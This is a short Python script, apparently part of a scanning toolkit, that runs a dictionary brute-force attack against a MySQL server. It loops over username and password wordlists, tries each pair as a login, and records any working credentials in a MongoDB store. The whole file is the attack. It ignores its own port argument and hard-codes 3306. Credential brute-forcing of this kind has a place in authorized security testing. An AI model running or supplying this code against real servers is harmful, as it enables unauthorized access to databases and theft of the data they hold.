#coding:utf-8
import MySQLdb

def mysql_attack(host, port, mongo):
    _info = dict(
        name="mysql",
        ip=host,
        port=port,
        username="",
        password=""
    )

    # 字典爆破测试
    for username in open("dict/mysql_user.dic", "r"):
        for password in open("dict/mysql_pass.dic", "r"):
            _username = username.strip()
            _password = password.strip()
            try:
                db = MySQLdb.connect(host=host, user=_username, passwd=_password, port=3306)
                _info["username"] = _username
                _info["password"] = _password
                mongo.insert(_info)
                db.close()
                break
            except:
                pass
